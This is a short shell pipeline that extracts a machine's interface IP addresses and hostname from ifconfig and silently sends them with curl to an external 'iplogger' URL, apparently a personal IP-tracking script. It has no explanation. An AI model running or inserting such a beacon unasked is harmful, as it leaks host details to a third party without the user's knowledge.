
/sbin/ifconfig | 
    tr -s ' ' '|' | 
    sed "s/|inet|addr:/ip=/g" | 
    grep -v  "^|" | 
    grep -B 1 "^ip=" | 
    awk '{split($0,a,"[|]+"); print a[1]}' | 
    tr "\\n" '&' | 
    sed "s/--&/ /g"  | 
    tr ' ' '\n'$host | 
    awk '{print "http://0th.me/iplogger/?name='`hostname`'_"$0}' | 
    sed 's/&$//' |
    xargs curl > /dev/null 2>&1

